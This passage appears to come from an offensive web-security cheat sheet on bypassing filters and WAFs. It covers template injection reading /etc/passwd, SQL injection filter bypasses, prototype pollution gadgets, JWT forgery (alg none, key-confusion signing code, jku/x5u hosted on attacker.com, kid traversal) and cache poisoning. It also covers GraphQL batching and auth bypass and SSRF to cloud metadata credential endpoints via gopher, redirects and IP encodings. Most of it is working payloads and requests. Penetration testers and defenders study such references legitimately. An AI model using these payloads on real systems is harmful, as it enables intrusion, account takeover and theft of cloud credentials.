@inject('x', 'App\Services\SomeService')

// Bypass via view file inclusion
@include('/etc/passwd')

// Bypass via custom directive
@php
echo file_get_contents('/etc/passwd');
@endphp

// Bypass via unescaped echo
{!! file_get_contents('/etc/passwd') !!}
```

---

## SQL Filter Bypass Deep

Advanced SQL injection bypass techniques beyond basic keyword substitution.

### Operator Substitution

```sql
-- AND → &&
ORIGINAL: ' OR 1=1--
BYPASS:  ' || 1=1--

-- OR → ||
ORIGINAL: ' OR '1'='1
BYPASS:  ' || '1'='1

-- = → LIKE → IN → BETWEEN → REGEXP → <>
ORIGINAL: ' OR id=1--
BYPASS:  ' OR id LIKE 1--
BYPASS:  ' OR id IN(1)--
BYPASS:  ' OR id BETWEEN 0 AND 2--
BYPASS:  ' OR id REGEXP 1--
BYPASS:  ' OR id <> 0--

-- != → <> → NOT IN → NOT BETWEEN
ORIGINAL: ' AND id!=0--
BYPASS:  ' AND id<>0--
```

### Comment Injection Between Keywords

```sql
-- Block comment inside keyword (SEL/**/ECT)
ORIGINAL: SELECT * FROM users
BYPASS:  SEL/**/ECT * FR/**/OM users

-- Multi-line comment
ORIGINAL: 1' UNION SELECT 1,2,3 --
BYPASS:  1' UN/**/ION SEL/**/ECT 1,2,3 --

-- Nested comments (MySQL)
ORIGINAL: 1' UNION SELECT 1,2,3 --
BYPASS:  1' UN/**/ION/**/SEL/**/ECT 1,2,3 --

-- Dash comments with various terminators
ORIGINAL: 1' OR 1=1 --
BYPASS:  1' OR 1=1 -- -
BYPASS:  1' OR 1=1 --+
BYPASS:  1' OR 1=1 --//
BYPASS:  1' OR 1=1 --%20
```

### No-Comment Bypass

```sql
-- Space-based keyword splitting
ORIGINAL: 1' UNION SELECT 1,2,3 --
BYPASS:  1' UN ION SEL ECT 1,2,3 --

-- Tab-based splitting
ORIGINAL: 1' UNION SELECT 1,2,3 --
BYPASS:  1' UN	TAB	ION SEL	TAB	ECT 1,2,3 --

-- Newline-based
ORIGINAL: 1' UNION SELECT 1,2,3 --
BYPASS:  1' UN%0aION SEL%0aECT 1,2,3 --
```

### HTTP Verb-Based Bypass

```http
# WAF only inspects GET parameters
GET /api/search?q=1'+OR+1=1-- HTTP/1.1
→ BLOCKED by WAF

# POST bypass — WAF may not inspect POST body
POST /api/search HTTP/1.1
Content-Type: application/json

{"q": "1' OR 1=1--"}
→ ALLOWED by WAF, exploited in app

# PUT/DELETE/OPTIONS — WAF may not inspect these verbs
PUT /api/users HTTP/1.1
Content-Type: application/x-www-form-urlencoded

q=1'+OR+1=1--
```

### Novel Whitespace Alternatives

```sql
-- Backtick as whitespace alternative (MySQL)
ORIGINAL: SELECT * FROM users
BYPASS:  SELECT`*`FROM`users`

-- %A0 (non-breaking space in Latin-1)
ORIGINAL: 1' UNION SELECT 1,2,3 --
BYPASS:  1'%A0UNION%A0SELECT%A01,2,3 --

-- Form feed (%0C)
ORIGINAL: 1' UNION SELECT 1,2,3 --
BYPASS:  1'%0CUNION%0CSELECT%0C1,2,3 --

-- Tab (%09)
ORIGINAL: 1' UNION SELECT 1,2,3 --
BYPASS:  1'%09UNION%09SELECT%091,2,3 --

-- Vertical tab (%0B)
ORIGINAL: 1' UNION SELECT 1,2,3 --
BYPASS:  1'%0BUNION%0BSELECT%0B1,2,3 --
```

### Information_Schema Alternatives

```sql
-- Standard: information_schema.tables
-- MySQL alternatives:
SELECT * FROM mysql.innodb_table_stats;           -- Lists all tables
SELECT * FROM mysql.innodb_index_stats;           -- Lists indexes  
SELECT * FROM sys.schema_auto_increment_columns;  -- Lists auto-increment columns
SELECT * FROM sys.schema_table_statistics;        -- Table statistics

-- MySQL PROCEDURE ANALYSE() alternative
SELECT * FROM users PROCEDURE ANALYSE();
-- This returns column information about the table

-- sys schema (MySQL 5.7+)
SELECT * FROM sys.schema_unused_indexes;
SELECT * FROM sys.schema_redundant_indexes;
SELECT * FROM sys.schema_table_lock_waits;

-- PostgreSQL alternatives
SELECT * FROM pg_catalog.pg_tables;
SELECT * FROM pg_catalog.pg_class;
SELECT * FROM pg_catalog.pg_attribute;

-- MSSQL alternatives
SELECT * FROM sys.tables;
SELECT * FROM sys.columns;
SELECT * FROM sys.objects;
SELECT * FROM sys.all_objects;

-- Oracle alternatives
SELECT * FROM all_tables;
SELECT * FROM user_tab_columns;
SELECT * FROM dba_objects;
```

### Boolean-Based Blind with Heavy Queries

```sql
-- Time-based when SLEEP()/WAITFOR is blocked:
-- MySQL: BENCHMARK(count, expression)
ORIGINAL: 1' AND SLEEP(5)--
BYPASS:  1' AND BENCHMARK(50000000, MD5('a'))--

-- Heavy query for conditional timing:
1' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B) > 0 --

-- PostgreSQL: generate_series + heavy function
1' AND (SELECT COUNT(*) FROM generate_series(1, 10000000)) > 0 --

-- MSSQL: heavy join
1' AND (SELECT COUNT(*) FROM sysobjects A, sysobjects B) > 0
```

### Stacked Query Bypass

```sql
-- When semicolon-based stacking is blocked:
-- MySQL: use SLEEP in WHERE clause
1' AND IF(1=1, SLEEP(5), 0)--

-- Multi-statement via INTO OUTFILE
1' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/test.php'--

-- Multi-statement via PREPARE
1'; PREPARE stmt FROM 'SELECT version()'; EXECUTE stmt;--

-- MySQL: DO statement
1' OR (DO SLEEP(5))--  -- DO doesn't return results
```

---

## Prototype Pollution Advanced

### Client-Side vs Server-Side Pollution

**Client-side:** Pollute `Object.prototype` to affect properties read by the application:

```javascript
// Attacker-controlled input:
{"__proto__": {"isAdmin": true}}

// If application does:
if (user.isAdmin) { grantAccess(); }
// All objects inherit isAdmin: true
```

**Server-side:** Same concept but polluting on Node.js server:
```javascript
// POST body with:
{"__proto__": {"admin": true}}

// In Express middleware:
// req.__proto__ now has admin: true
// req.admin → true
```

### DOM-Based Sinks

```javascript
// Sinks that can be exploited via prototype pollution:

// innerHTML — inject arbitrary HTML
element.innerHTML = obj.html || "<default>";

// document.write — write to page
document.write(obj.content);

// eval — execute arbitrary code
eval(obj.script);

// Function constructor
new Function(obj.code)();

// setTimeout/setInterval with string
setTimeout(obj.fn, 0);

// src attribute injection
img.src = obj.url;

// href assignment
location.href = obj.redirect;

// RegExp injection
new RegExp(obj.pattern);
```

### Gadget Identification in Popular Libraries

**Lodash:**
```javascript
// Lodash merge — vulnerable pattern:
_.merge(target, source);  // No hasOwnProperty check

// Lodash defaultsDeep
_.defaultsDeep(target, source);

// Lodash set
_.set(target, path, value);  // Can traverse __proto__

// Gadget chain:
// 1. Pollution: {"__proto__": {"polluted": true}}
// 2. Application uses: _.get(obj, 'some.path', 'default')
// 3. Some.path returns default
// 4. But somewhere in the codebase:
//    if (obj[pollutedKey]) { doSomething() }
//    → obj.polutedKey is now true for ALL objects
```

**jQuery:**
```javascript
// jQuery.extend — vulnerable pattern (deep: true)
$.extend(true, {}, userInput);

// Gadget chain via jQuery:
// 1. Pollute Object.prototype with "URL" property
// 2. jQuery $.ajax checks if URL is set: if (options.url) { ... }
// 3. All AJAX calls now use the polluted URL → SSRF

// $.htmlPrefilter — old CVE gadget
// Pollution of __proto__.html causes XSS
```

**Express:**
```javascript
// Express merge query params into req.query
// If body-parser has prototype pollution:
// req.query.__proto__ → pollutes Object.prototype

// Gadget in Express:
// Express uses options.for in some middleware
// Polluting "for" can affect JSON parsing

// Express cookie-parser:
// Signed cookie secret check can be bypassed
```

**Mongoose (MongoDB ORM):**
```javascript
// Mongoose allows $ operators in queries
// Prototype pollution can inject $where:
{"__proto__": {"$where": "sleep(5000)"}}

// All subsequent MongoDB queries include $where
// → NoSQL injection via prototype pollution

// Mongoose schema bypass:
// Schema defines: role: { type: String, enum: ['user', 'mod'] }
// Pollution: {"__proto__": {"role": "admin"}}
// If check is: if (user.role === 'admin') { ... }
// → Every user is admin
```

### Node.js Core Prototypes

Each built-in prototype can be a pollution target:

```javascript
// Object.prototype — most common
Object.prototype.x = "polluted";

// Array.prototype
Array.prototype[0] = "polluted";

// Function.prototype
Function.prototype.call = function() { /* malicious */ };

// String.prototype
String.prototype.includes = function() { return true; };

// Number.prototype
Number.prototype.toFixed = function() { /* malicious */ };
```

**Gadgets in Node.js core:**
```javascript
// Pollute Object.prototype with 'argv' key
// Some Node.js modules check process.argv
// If Object.prototype.argv is set, it overrides

// Pollute 'statusCode' — affects HTTP response
// Some libraries check: if (res.statusCode) { ... }
// If Object.prototype.statusCode is set, all responses match

// Pollute 'headers' — affects HTTP request parsing
```

### Merging Functions Without hasOwnProperty

Vulnerable merge pattern:

```javascript
function merge(target, source) {
    for (var key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
// Missing: if (!source.hasOwnProperty(key)) continue;
// The for...in loop iterates over prototype chain
// source.__proto__ is iterated if it's set in the input
```

Safer versions:

```javascript
function safeMerge(target, source) {
    for (var key in source) {
        if (!source.hasOwnProperty(key)) continue;  // Skip prototype
        if (key === '__proto__' || key === 'constructor') continue;  // Block dangerous keys
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            safeMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

---

## JWT Attack Deep

### Algorithm Confusion Attacks

**alg: none:**
```json
{
  "alg": "none",
  "typ": "JWT"
}
{
  "sub": "admin",
  "role": "admin"
}
```
Some JWT libraries accept `alg: none` even on signed endpoints. The server reads the header, sees "none", and doesn't verify the signature.

```bash
# Create token with alg: none
echo -n 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.'
# Header: {"alg":"none","typ":"JWT"} → base64 = eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
# Payload: {"sub":"admin","role":"admin"} → base64 = eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9  
# Signature: empty
```

**HMAC using public key (RS256 → HS256):**
```python
# If server uses RS256 (RSA private key to sign, public key to verify)
# But attacker changes alg to HS256 (symmetric HMAC)
# Verification uses public_key.verify() for RS256
# But Public_key.verify() for HS256 means: HMAC(public_key, data)
# Since the public key is... public, the attacker knows it

# Attack:
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# Sign JWT with HS256 using public key as secret
import hmac, hashlib, base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "role": "admin"}).encode()).rstrip(b'=')
signature = hmac.new(public_key.encode(), f"{header.decode()}.{payload.decode()}".encode(), hashlib.sha256).digest()
sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=')

token = f"{header.decode()}.{payload.decode()}.{sig_b64.decode()}"
```

### JWK Injection via jku Header

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/jwk.json",
  "kid": "attacker-key-1"
}
```

The `jku` (JWK Set URL) header tells the verifier where to fetch the public key:
```bash
# Host a JWK Set on attacker-controlled server:
# https://attacker.com/jwk.json
{
  "keys": [{
    "kty": "RSA",
    "kid": "attacker-key-1",
    "n": "0vx7agoebGcQSuu...",
    "e": "AQAB",
    "d": "XYZ123..."
  }]
}
```

If the JWT library fetches the key from the URL without validation, you control the public key.

**Bypass jku validation:**
- SSRF via jku (internal metadata endpoint)
- Host header injection in jku fetch
- Protocol smuggling (jku: `file:///etc/passwd`)

### kid Path Traversal

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../etc/passwd"
}
```

The `kid` (Key ID) header is often used to look up the secret from a file:

```python
# Vulnerable pattern:
secret = open(f"/keys/{jwt_header['kid']}").read()
```

With `kid: ../../../etc/passwd`:
- Path becomes `/keys/../../../etc/passwd` = `/etc/passwd`
- Secret = contents of `/etc/passwd`
- The attacker knows `/etc/passwd`, signs the token with it

```bash
# Sign JWT using /etc/passwd content as HMAC secret
SECRET=$(cat /etc/passwd)
```

### x5u / x5c Certificate Injection

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "x5u": "https://attacker.com/cert.pem"
}
```

`x5u` points to an X.509 certificate URL. If the library fetches it:
- Host a certificate you control
- The library imports the public key from the certificate

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "x5c": ["MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA..."]
}
```

`x5c` contains the certificate inline (base64 DER). If the library uses this without validation:
```python
from cryptography import x509
from cryptography.hazmat.backends import default_backend

# Library might decode x5c inline:
cert = base64.b64decode(jwt_header['x5c'][0])
public_key = x509.load_der_x509_certificate(cert, default_backend()).public_key()
```

### Sub Claim Manipulation

```json
// Original token
{ "sub": "user_123", "role": "user" }

// Modified token
{ "sub": "admin", "role": "admin" }
```

If the JWT verification checks signature validity but doesn't validate `sub` format:
- `sub` claim may map to user ID in the application
- Changing `sub` to another user's ID gains access to their account
- Empty `sub` may be treated as admin or system user

### Token Swap Across Different Issuers

```json
// Token from service A (iss: app1.example.com)
{ "iss": "app1.example.com", "sub": "user_123", "role": "admin" }

// Token used on service B (iss: app2.example.com)
// If both services share the same JWT secret or public key:
// → Attacker uses App A's admin token on App B
```

**Test:** 
1. Get a token from one subdomain/service
2. Use it on another subdomain/service
3. If accepted → cross-service token swap vulnerability

### JWT Compression Oracle (JWE)

JWE (JSON Web Encryption) supports compression before encryption:

```json
{
  "alg": "RSA-OAEP",
  "enc": "A128CBC-HS256",
  "zip": "DEF"
}
```

If `zip: "DEF"` (deflate compression), the plaintext is compressed before encryption. This enables a CRIME/BREACH-style compression oracle:

- Attacker controls part of the JWE plaintext
- Attacker observes ciphertext length
- When attacker-controlled content matches a secret (e.g., CSRF token), compressed size decreases
- Iterative guessing reveals the secret

### JWT Silent Brute Force with Weak Secrets

```python
# Many JWT implementations use HMAC-HS256 with a weak secret
# Common weak secrets to test:
common_secrets = [
    "secret", "password", "123456", "secret123",
    "jwt_secret", "mysecret", "changeme", "admin",
    "token", "key", "jwt", "supersecret",
    "test", "development", "debug", "qwerty",
    "companyname", "appname", "api_secret_key",
]
```

```bash
# Brute force JWT secret with john:
python3 /opt/jwt_tool/jwt_tool.py -T -C -d secrets.txt eyJhbGciOiJIUzI1NiIs...

# Or with hashcat:
hashcat -m 16500 jwt.txt secrets.txt
```

---

## Cache Poisoning Advanced

### Cache Key Analysis

**Understanding cache key composition:**

```http
# Default cache key often includes:
# - Request method (GET)
# - Host header
# - URL path + query string

# NOT included (unkeyed):
# - Most headers except Host
# - Request body
# - HTTP version
```

**Identify unkeyed inputs:**
```bash
# Test which headers affect the response but not the cache key
# Send request with extra header:
curl -k "https://target.com/profile" -H "X-Forwarded-Host: attacker.com"

# Compare cache key behavior:
# 1. Request once
# 2. Request again with different header
# 3. If same cache key → second request returns first response
```

### Craft Payload in Unkeyed Header

```http
# Unkeyed header: X-Forwarded-Host
# Target endpoint reflects it in redirect URL:
GET /profile HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# Response:
HTTP/1.1 302 Found
Location: https://attacker.com/profile
# This gets cached!
```

```http
# Unkeyed header: X-Original-URL or X-Rewrite-URL
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin

# Some proxies use X-Original-URL for internal routing
# If this header is unkeyed, cache the admin response for /
```

**Cache poisoning with XSS:**
```http
# Unkeyed header reflected in page without encoding:
GET /search HTTP/1.1
Host: target.com
X-Forwarded-Host: "><script>alert(1)</script>.evil.com

# Cached for all users visiting /search
```

### Cache Deception

Forcing private content into a public cache:

```http
# Normal: GET /api/user/profile → 200, private data, not cached
# 
# Cache deception: append static extension
GET /api/user/profile/test.css HTTP/1.1
Host: target.com

# Application interprets /api/user/profile/test.css as /api/user/profile
# But the CDN sees ".css" and caches the response
# Next user requesting /api/user/profile/test.css gets the cached private data
```

```http
# Variations:
GET /api/orders/12345/;/test.js
GET /api/orders/12345?x=.css
GET /api/orders/12345%23test.js
GET /api/orders/12345/test.js?/
```

### Cache Key Normalization Differences

**CDN vs Origin normalization:**

| CDN | Behavior |
|-----|----------|
| Cloudflare | Normalizes paths: `/foo/` = `/foo` |
| Cloudflare | Decodes percent-encoded characters in key |
| Cloudflare | Sorts query parameters alphabetically |
| Fastly | Case-insensitive hostname in key |
| Fastly | Normalizes `//` to `/` |
| Akamai | Includes `?` but not query parameter values |
| AWS CloudFront | Case-sensitive path in key |

```http
# Exploit normalization differences:
# Cloudflare normalizes: /Path → /path
# Origin treats /Path and /path differently

GET /Admin HTTP/1.1
# Cloudflare cache key: /admin
# Origin serves /Admin → different content
# Cache key collision with /admin
```

**Path confusion for shared caches:**
```http
# CDN treats these as different cache keys:
GET /api/user?id=123
GET /api/user?id=456

# But origin may serve the same response (wrong data cached as correct)
# If origin has: /api/user returns current user regardless of ?id param
# ?id is in cache key but doesn't affect response → waste of cache
```
```http
GET /api/user?id=456&callback=jsonp123
# If ?id is unkeyed but callback is keyed:
# CDN caches different versions per callback value
# Origin always returns user 123's data regardless of id param
# User 456 requests with a new callback → gets User 123's cached data
```

### Varying Cache Behavior by HTTP Method

```http
# CDN caches GET, but does it cache HEAD?
HEAD /api/user/profile HTTP/1.1

# HEAD response may include Content-Length from GET
# If HEAD is keyed differently, cache poison only affects HEAD

# POST requests are generally not cached, but:
POST /api/search HTTP/1.1
Content-Type: application/x-www-form-urlencoded

q=session
# Some CDNs cache POST when there are cache-control: public headers
```

### Separate Cache for Mobile vs Desktop

```http
# CDN uses Vary: User-Agent to differentiate mobile vs desktop cache
# But specific User-Agent values may bypass:
User-Agent: Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36

# If mobile cache is separate from desktop:
# Poison mobile cache for one path
# Administrators viewing mobile version get poisoned content
```

---

## GraphQL Deep Bypass

### Introspection Disabled Workarounds

When `__schema` is blocked:

**Field brute-forcing via error messages:**
```graphql
query {
  user { id }
}
# If field exists: returns data
# If field doesn't exist: returns error

# Brute force field names:
query {
  user { id email password ssn ssn_number credit_card }
}
# Only valid fields return data — error messages reveal field names
```

**Schema stitching via indirect references:**
```graphql
# If a type is used but not directly queryable:
query {
  __type(name: "User") {
    name
    fields {
      name
      type { name }
    }
  }
}
# __type may still work even when __schema is blocked
```

**Error message analysis:**
```graphql
query {
  user(id: "invalid") { id }
}
# Error: "Cannot return null for non-nullable field User.id"
# Error: "Argument 'id' has invalid value 'invalid'"
# Error messages leak type information
```

### Query Depth Bypass via Aliases

```graphql
# Depth limit: 5 levels
query {
  user {
    posts {
      comments {
        author {
          posts {  # Depth 5 — blocked by depth limit
            id
          }
        }
      }
    }
  }
}

# Bypass via aliases — each alias counts as its own query:
query {
  a: user {
    b: posts {
      c: comments {
        d: author {
          e: posts { id }
        }
      }
    }
  }
  f: user {
    g: posts {
      h: comments {
        i: author {
          j: posts { id }
        }
      }
    }
  }
}
# The depth limit checker may not detect aliases as separate queries
```

### Batching Bypass via Recursive Fragments

```graphql
# Rate limit: 100 queries per minute
# Bypass via batch query:

fragment UserData on User {
  id
  email
  posts { id title }
}

fragment AllData on Query {
  u1: user(id: 1) { ...UserData }
  u2: user(id: 2) { ...UserData }
  # ...100x more
  u100: user(id: 100) { ...UserData }
}

query {
  ...AllData
}

# One HTTP request = 100 user queries = 100x throughput
```

**Recursive fragment for infinite results:**
```graphql
fragment Infinite on Post {
  id
  comments {
    items {
      ...Infinite  # Recursive — no depth limit
    }
  }
}

query {
  post(id: 1) {
    ...Infinite
  }
}
```

### Rate-Limit Bypass via Field-Level Granularity

```graphql
# If rate limit counts requests, not operations:

# Request 1: Get user emails (100 users)
query {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  # ...98 more
  user100: user(id: 100) { email }
}

# Request 2: Get user passwords (same 100 users)
query {
  user1: user(id: 1) { password }
  # ...
}
```

**Mutation batching:**
```graphql
# Rate limit: 10 mutations/minute
# Bypass:
mutation {
  m1: updateUser(id: 1, input: {role: "admin"}) { id role }
  m2: updateUser(id: 2, input: {role: "admin"}) { id role }
  m3: updateUser(id: 3, input: {role: "admin"}) { id role }
  # ...up to N mutations per request
  m20: updateUser(id: 20, input: {role: "admin"}) { id role }
}
```

### Auth Bypass Through Mutations

```graphql
# Some mutations don't check resolver-level permissions:

mutation {
  # Create user (should be admin-only)
  createUser(input: {email: "attacker@evil.com", role: "admin"}) {
    id
    role
  }
  
  # Delete another user (should require ownership)
  deleteUser(id: 5)
  
  # Update without ownership check
  updateUser(id: 5, input: {email: "hijacked@evil.com"})
  
  # Impersonate
  generateUserToken(userId: 5)
}
```

---

## SSRF Deep Bypass

Beyond basic `127.0.0.1` — protocol-level and logic-level SSRF bypasses.

### DNS Rebinding

Single-request-double-IP technique:

1. Register a domain with a very short TTL (e.g., 0)
2. When the application first resolves the domain, it points to your external server
3. The application validates the response (checks that it's external, not internal)
4. Before the actual request, the DNS record changes to point to 127.0.0.1
5. The application makes the request to what it thinks is your server but is actually localhost

```bash
# DNS rebinding services:
# - 1u.ms (1u.ms — resolves to two IPs)
# - rebind.it
# - lock.cmpxchg.io

# Test: Create a domain that alternately resolves to:
# A record 1: 203.0.113.1 (your server, passes IP validation)
# A record 2: 127.0.0.1   (internal, bypasses hostname validation)
```

### Redirect-Based SSRF

Application validates the target IP, but follows redirects:

```http
POST /api/fetch HTTP/1.1
Content-Type: application/json

{"url": "https://attacker.com/redirect-to-internal"}
```

Your external server responds:
```http
HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/
```

If the application follows redirects without re-validating the target:
- `https://attacker.com/redirect-to-internal` → passes initial validation
- Redirect to `169.254.169.254` → internal access

**Redirect bypass variants:**
```http
{"url": "http://attacker.com/"}  # 302 → http://127.0.0.1
{"url": "http://attacker.com/"}  # 302 → file:///etc/passwd
{"url": "http://bit.ly/abc123"}  # URL shortener redirects internally

# Meta refresh redirect:
http://attacker.com/redirect.html
# <meta http-equiv="refresh" content="0;url=http://169.254.169.254/">
```

### Protocol Smuggling

SSRF that validates HTTP-only but uses other protocols:

```bash
# Gopher protocol — full control of TCP stream:
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a...
# Sends arbitrary Redis commands to 127.0.0.1:6379

# Dict protocol — limited but useful:
dict://127.0.0.1:6379/INFO
# Sends the word "INFO" to 127.0.0.1:6379 (Redis command)

# File protocol — local file reading:
file:///etc/passwd
file:///proc/self/environ

# FTP protocol — can be used for port scanning:
ftp://127.0.0.1:22/
# Response: 220 SSH server ready → confirms port 22 is open

# LDAP protocol:
ldap://127.0.0.1:389/

# SMB protocol (Windows):
file://attacker-server/SharedFolder

# SMB via UNC (Windows):
\\attacker-server\share
```

### IPv6 / IPv4-Mapped IPv6

```bash
# Direct IPv4 bypass:
127.0.0.1        → Blocked
localhost        → Blocked

# IPv6 loopback:
[::1]            → May bypass IPv4-only blocklists
[0:0:0:0:0:0:0:1] → Same as ::1

# IPv4-mapped IPv6:
[::ffff:127.0.0.1] → Some parsers see this as IPv6, not loopback
[::ffff:169.254.169.254] → Cloud metadata via IPv6

# IPv4-compatible IPv6 (deprecated but sometimes accepted):
[::127.0.0.1]
[::169.254.169.254]
```

### Decimal/Octal IP Notation

```python
# Dotted decimal:  127.0.0.1
# Decimal:         2130706433  (= 127*256^3 + 0*256^2 + 0*256 + 1)
# Octal:           0177.0.0.1
# Hex:             0x7f.0.0.1
# Mixed:           0x7f.0.0.1
# Octal with dots: 0177.0.0.01
# Decimal with leading zeros: 127.00.0.01
```

```bash
# Cloud metadata IP 169.254.169.254 in various forms:
# Decimal:         2852039166
# Octal:           0o371.0o366.0o251.0o366
# Octal (short):   0371.0366.0251.0366
# Hex:             0xA9.0xFE.0xA9.0xFE
# Hex combined:    0xA9FEA9FE
# Mixed:           0xA9.366.0xA9.366
# Zero-padded:     169.254.169.254 (still works with leading zeros)
```

### Cloud Metadata Endpoint Variations

**AWS:**
```bash
# Standard:
http://169.254.169.254/latest/meta-data/

# Via HTTP header:
http://169.254.169.254/latest/meta-data/
# Header: X-aws-ec2-metadata-token-ttl-seconds: 21600

# Via IMDSv2:
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl "http://169.254.169.254/latest/meta-data/" \
  -H "X-aws-ec2-metadata-token: $TOKEN"
```

**GCP:**
```bash
# Standard:
http://169.254.169.254/computeMetadata/v1/
# Required header: Metadata-Flavor: Google

# Access token:
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
# Header: Metadata-Flavor: Google

# Recursive metadata:
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/?recursive=true
```

**Azure:**
```bash
# Standard:
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header: Metadata: true

# Access token:
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Header: Metadata: true

# Via IMDS:
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### DNS-Based Bypass (Attacker-Controlled Domain)

Register a domain that resolves to an internal IP after TTL:

```bash
# 1. Register: evil-bind.example
# 2. Create A record: 203.0.113.1 (your external server)
# 3. Wait for TTL to expire
# 4. Change A record to: 127.0.0.1
# 5. Application fetches "http://evil-bind.example:6379/"
# 6. DNS resolves to 127.0.0.1 internally

# Alternative: Wildcard DNS
# *.nip.io resolves to IP in the name:
# 127-0-0-1.nip.io → 127.0.0.1
# 169-254-169-254.nip.io → 169.254.169.254

# Other DNS-based bypass (no registration needed):
# 127.0.0.1.nip.io → 127.0.0.1
# 1.0.0.127.xip.io → 127.0.0.1
# localhost.spamservice.net → 127.0.0.1
```

### SSRF Bypass Table

| Bypass Technique | Example | Works When |
|-----------------|---------|------------|
| Decimal IP | `2130706433` | IP validation checks string format |
| Octal IP | `0177.0.0.1` | IP pattern match is regex-based |
| IPv6 loopback | `[::1]` | Blocklist only has `127.0.0.1` |
| IPv4-mapped IPv6 | `[::ffff:127.0.0.1]` | IPv6 enabled, blocklist misses mapping |
| DNS rebinding | `rebind.it` → two alternating IPs | Validation before DNS resolution |
| Redirect | External→internal redirect | Follows redirects without re-validation |
| DNS services | `127.0.0.1.nip.io` | DNS-based internal IP resolution |
| Shortened URL | `bit.ly/xyz` → expands to internal | Validation before expansion |
| Protocol injection | `file:///etc/passwd` | Only validates HTTP protocols |
| Gopher | `gopher://redis:6379/_` | TCP-level protocol, not validated |
| JavaScript redirect | Client-side JS redirect after validation | Only validates initial URL |
| Unicode in hostname | `②⑨⑨①` in some contexts | UTF-8 hostname processing |
| CIDR bypass | `http://0.0.0.0:6379/` (0.0.0.0 = localhost) | 0.0.0.0 not in private IP blocklist |
| URL parser differential | `http://127.0.0.1#@evil.com` (different parsers disagree on host) | URL parsing differences |

---

## Checklist

### Parser Differential Test Checklist

#### HTTP Smuggling
- [ ] Test CL.TE — Content-Length front-end, Transfer-Encoding back-end
- [ ] Test TE.CL — Transfer-Encoding front-end, Content-Length back-end
- [ ] Test H2.CL — HTTP/2 downgrade with Content-Length injection
- [ ] Test H2.TE — HTTP/2 downgrade with Transfer-Encoding injection
- [ ] Test obfuscated Transfer-Encoding values (case, spaces, multi-header)
- [ ] Test `Connection: keep-alive, Upgrade` for state confusion
- [ ] Test timing-based detection (smuggled request with slow response)

#### Parameter Pollution
- [ ] Test duplicate query parameters (framework takes first vs last)
- [ ] Test duplicate body parameters (form-data hybrid)
- [ ] Test duplicate headers (X-Forwarded-For, Cookie, Authorization)
- [ ] Test parameter array notation (`role[]=user&role[]=admin`)
- [ ] Test body + query parameter mixing

#### Content-Type Confusion
- [ ] Test switching Content-Type between form-urlencoded and multipart
- [ ] Test switching Content-Type between JSON and form data
- [ ] Test switching Content-Type between XML and JSON
- [ ] Test Content-Type override headers (X-Content-Type-Override)
- [ ] Test per-part Content-Type in multipart body

#### JSON/XML Parser Differentials
- [ ] Test duplicate JSON keys (first key vs last key behavior)
- [ ] Test JSON comments (if parser supports non-standard comments)
- [ ] Test JSON unicode escapes in keys (`\u0052ole`)
- [ ] Test XML comments in tags (`<ro<!--x-->le>`)
- [ ] Test XML external entities if XML parsing is available

### Protocol Attack Checklist

#### HTTP/2 Specific
- [ ] Test if server accepts HTTP/2 and WAF is HTTP/1.1 only
- [ ] Test HTTP/2 to HTTP/1.1 downgrade smuggling
- [ ] Test H2C (cleartext HTTP/2) upgrade from HTTP/1.1
- [ ] Test HTTP/2 pseudo-header injection

#### HTTP/3 Specific
- [ ] Test if server accepts QUIC (HTTP/3 on UDP)
- [ ] Test if WAF inspects HTTP/3 traffic at all
- [ ] Test if HTTP/3 bypasses rate limiting or auth checks

#### WebSocket Abuse
- [ ] Test if WebSocket upgrade bypasses normal HTTP inspection
- [ ] Test if back-end processes request body after accepting WebSocket
- [ ] Test cross-protocol attacks (WS for normal HTTP endpoint)

#### Chunked Encoding Variations
- [ ] Test case variations in Transfer-Encoding value
- [ ] Test multiple Transfer-Encoding headers
- [ ] Test obsolete transfer codings (identity, x-unknown)
- [ ] Test chunk extensions (chunked; param=value)

### Encoding Bypass Checklist

#### Unicode Attacks
- [ ] Test UTF-8 overlong sequences for path traversal
- [ ] Test UTF-16 surrogate injection in JSON strings
- [ ] Test NFD/NFKC normalization bypass for string comparison
- [ ] Test BOM injection at start of request body
- [ ] Test CESU-8 if MySQL/MariaDB is in use
- [ ] Test combining characters to break up keywords
- [ ] Test homoglyphs in hostname, path, and parameter names
- [ ] Test zero-width characters in input strings

#### Charset Attacks
- [ ] Test charset mismatch between Content-Type header and actual encoding
